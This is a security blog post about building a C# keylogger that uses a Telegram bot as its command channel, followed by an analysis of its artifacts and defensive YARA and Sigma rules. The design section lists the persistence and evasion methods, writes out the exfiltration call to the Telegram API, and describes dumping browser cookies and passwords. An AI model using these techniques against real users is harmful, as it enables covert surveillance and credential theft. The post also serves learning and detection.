@@ -1,0 +1,161 @@
+---
+title: Building my first keylogger
+date: 2025-12-16 00:00:00 +0000
+categories:
+  - Malware
+tags:
+  - malware
+  - keylogger
+  - cybersecurity
+pin: true
+---
+
+Once upon a time, a friend of mine told me
+"Ca sa fii un portar bun, trebuie sa stii cum gandeste un atacant"
+N-am aparat o minge niciodata.
+
+This project was started to learn malware development techniques and to better understand how antivirus solutions like Microsoft Defender detect and flag malicious files.
+
+I began working on it in the summer of 2025. Prior to this, I worked with various C2 frameworks such as Metasploit, PowerShell Empire, Havoc, and Cobalt Strike, playing around with payload obfuscation and evasion techniques, until I saw a Youtube video showcasing a threat actor using a telegram channel as a C2.
+
+This went into a research on what can be used as a C2, as I found out some people where using the in game console of Counter-Strike.
+
+Overall, this project served as a solid introduction to malware development concepts.
+
+---
+
+#### Malware Design & Capabilities
+
+The malware, is a feature-rich keylogger written in C#:
+- File download (up to 50MB)
+- Clipboard sniffing
+- Active window tracking
+- Persistence mechanisms > Registry, Scheduled Task, and Startup Folder
+- Command execution with admin privileges > UAC prompt, old and simple method
+- Multi-session handling
+
+Dropping this .exe on a Windows machine via browser download/certutil/wget/iex will get caught by MotW by default.
+
+For C2 communication, it uses the **Telegram Bot API**, sending data via:
+`HttpClient.PostAsync("https://api.telegram.org/botXXX/sendMessage", content);`
+
+This communication is encrypted over HTTPS and can be hidden using **DNS fronting** through a Cloudflare domain.
+
+Telegram commands:
+- `/visual`
+    Capture a screenshot
+
+- `/locate`
+    Change directory and list it's contents
+
+- `/status`
+    Test if the connection is still available and admin capabilities ( writing to HKLM registery)
+
+- `/retrieve`
+Download files up to 50mb
+
+**Virus Total Scan:**
+![VirusTotal scan](/assets/img/malware/keylogger/Pasted%20image%2020260211155046.png)
+![VirusTotal scan](/assets/img/malware/keylogger/Pasted%20image%2020260211155109.png)
+![VirusTotal scan](/assets/img/malware/keylogger/Pasted%20image%2020260211155123.png)
+I tested several droppers in C#, Python and Golang to download and execute the keylogger which proved inefficient, as the download-and-execute behavior itself is a major red flag for behavioral analysis and MotW.
+
+I became curious about browser data exfiltration, specifically, cookies and passwords.
+
+I found a GitHub project that accomplished this. Using the `/exec` command, we can download and run an application that extracts all the browser data into a JSON file and packages it into a ZIP archive, all done with no AV flags since it doesn't export the data to the internet but saves it locally. We then download this archive using the `/retrieve`command.
+
+- `/exec`
+![Exec command](/assets/img/malware/keylogger/Pasted%20image%2020251031153455.png)
+
+![Exec result](/assets/img/malware/keylogger/Pasted%20image%2020251031153916.png)
+
+---
+
+#### Behavioral Analysis & Key Artifacts
+
+The investigation began with Process Explorer, showing the malware spawning from `explorer.exe` and loading libraries like `user32.dll` and `kernel32.dll`
+  ![Process Explorer](/assets/img/malware/keylogger/Pasted%20image%2020250717130737.png)
+![Process Explorer](/assets/img/malware/keylogger/Pasted%20image%2020250717131823.png)
+
+This was confirmed by finding the key string "WH_KEYBOARD_LL" and the API call `SetWindowsHookEx`, which is the standard Windows method for implementing a keylogger.
+![SetWindowsHookEx](/assets/img/malware/keylogger/Pasted%20image%2020250717142214.png)
+
+**Uncovering the C2 Channel:**
+A simple way to find a Telegram bot token is to run `strings.exe` on a memory dump with the regex: `\d{9,10}:[a-zA-Z0-9_-]{35}`.
+
+The result was what we were looking for:
+![Bot token](/assets/img/malware/keylogger/Pasted%20image%2020250717144821.png)
+
+**Tracing Persistence and Data:**
+Using Process Monitor with filters for registry access and file activity in the `Temp` directory, we discovered a file created by the malware.
+![Process Monitor](/assets/img/malware/keylogger/Pasted%20image%2020250717133346.png)
+
+This file contained the Telegram Bot owner's Admin ID and a log of all commands executed.
+![Config file](/assets/img/malware/keylogger/Pasted%20image%2020250717134121.png)
+
+Further execution traces showed the malware attempting to load a non-existent DLL (`relsave.dll`) as part of its evasion logic and accessing device registry keys related to persistence.
+![Process Monitor](/assets/img/malware/keylogger/Pasted%20image%2020250717135303.png)
+
+**The Bigger Compromise:**
+With both the **Admin ID** and **Bot Token** exposed, the attacker's control channel becomes vulnerable. A simple `curl` request to the Telegram API can reveal the username of the account controlling the bot.
+![Curl reveal](/assets/img/malware/keylogger/Pasted%20image%2020250717153352.png)
+
+---
+#### Network Traffic & Evasion
+
+Network analysis alone would not have revealed the bot token, because of **DNS fronting**, used to disguise its traffic and keep the token encrypted in memory using a custom `CryptDecrypt.dll`, preventing it from appearing in plaintext within packet captures.
+  ![Network](/assets/img/malware/keylogger/Pasted%20image%2020250717141704.png)
+![Network](/assets/img/malware/keylogger/Pasted%20image%2020250717154252.png)
+
+---
+
+#### Mitigation & Defensive Strategy
+
+**Immediate Mitigation:**
+The fastest way to disrupt this C2 channel is to revoke the bot token itself.
+
+```bash
+curl -X POST "https://api.telegram.org/botTOKEN/revoke"  # Replace with actual Token
+```
+**Network-Level Blocking:**
+Block access to `api.telegram.org` and its primary IP ranges:
+- `149.154.167.0/24`
+- `91.108.4.0/22`
+
+**Proactive Detection:**
+
+**A. YARA Rule for Static Detection**
+Use this rule to scan disks and memory for related artifacts.
+
+```
+rule Telegram_Keylogger {
+   meta:
+      description = "Detects Telegram C2 keyloggers"
+   strings:
+      $s1 = "WH_KEYBOARD_LL" ascii wide
+      $s2 = "/bot" wide
+      $s3 = "SetWindowsHookEx" fullword
+   condition:
+      any of them
+}
+```
+
+**B. Sigma Rule for SIEM Alerting**
+This rule will alert on network traffic to the Telegram C2.
+
+```yaml
+title: Telegram Keylogger C2 Activity
+logsource:
+  category: proxy
+detection:
+  selection:
+    dst_port: 443
+    dst_ip:
+      - "149.154.167.220"  # Telegram API IP
+    method: "POST"
+    url:
+      - "/bot*/sendMessage"
+      - "/bot*/sendDocument"
+  condition: selection
+level: high
+```
